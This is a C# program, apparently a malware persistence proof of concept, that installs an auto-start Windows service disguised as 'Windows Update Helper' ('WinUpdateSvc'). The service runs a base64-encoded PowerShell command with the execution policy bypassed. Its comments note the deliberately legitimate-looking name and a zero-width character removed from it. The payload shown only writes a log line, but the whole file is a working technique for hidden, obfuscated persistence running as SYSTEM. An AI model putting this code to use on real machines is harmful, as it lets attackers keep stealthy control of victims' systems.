using System;
using System.Runtime.InteropServices;

namespace ScriptHelper
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            HiddenPersistence.Run();
        }
    }

    internal static class HiddenPersistence
    {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateService(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            uint dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr hSCObject);

        public static void Run()
        {
            // Service configuration
            string serviceName = "WinUpdateSvc"; // Removed zero-width char for reliability
            string displayName = "Windows Update Helper"; // Legitimate-looking name
            string tempLogPath = @"C:\Windows\Temp\script_ran.txt"; // SYSTEM-accessible path

            // Safe test command (writes to TEMP instead of Desktop)
            string testCommand = $@"
                [System.IO.File]::WriteAllText(
                    '{tempLogPath}', 
                    'Script ran at {DateTime.Now} as user $([Environment]::UserName)'
                )";

            string encodedCommand = Convert.ToBase64String(
                System.Text.Encoding.UTF8.GetBytes(testCommand)
            );

            string powershellCmd = $@"powershell.exe -ExecutionPolicy Bypass -EncodedCommand {encodedCommand}";

            // Service creation
            IntPtr scm = OpenSCManager(null, null, 0xF003F); // SC_MANAGER_ALL_ACCESS
            if (scm == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to open SCM. Error: " + Marshal.GetLastWin32Error());
                return;
            }

            IntPtr service = CreateService(
                scm,
                serviceName,
                displayName,
                0xF01FF, // SERVICE_ALL_ACCESS
                0x10,    // SERVICE_WIN32_OWN_PROCESS
                0x2,     // SERVICE_AUTO_START
                0x1,     // SERVICE_ERROR_NORMAL
                powershellCmd,
                null,
                IntPtr.Zero,
                null,
                null,
                null);

            if (service == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to create service. Error: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine($"[+] Service '{serviceName}' created successfully!");
                Console.WriteLine($"[*] Log will be written to: {tempLogPath}");
            }

            CloseServiceHandle(service);
            CloseServiceHandle(scm);
        }
    }
}
